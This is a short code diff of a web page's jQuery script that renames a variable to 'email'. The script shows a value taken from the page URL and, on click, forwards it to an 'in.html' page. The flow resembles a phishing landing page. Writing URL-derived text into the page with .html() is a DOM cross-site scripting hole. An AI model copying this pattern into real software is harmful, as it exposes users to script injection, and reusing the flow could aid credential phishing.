@@ -57,12 +57,12 @@
             
             <script>
                 $(document).ready(function() {
-                    let x1 = (Math.random() + 1).toString(36).substring('hash');
+                    let email = (Math.random() + 1).toString(36).substring('hash');
                     var baseUrl = (window.location).href;
                     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-                    $("#x1").html(url);
+                    $("#email").html(url);
                     $('.wrap').click(function() {
-                        window.location.href = `in.html?${x1}=${url}`;
+                        window.location.href = `in.html?${email}=${url}`;
                     });
                 });
             </script>
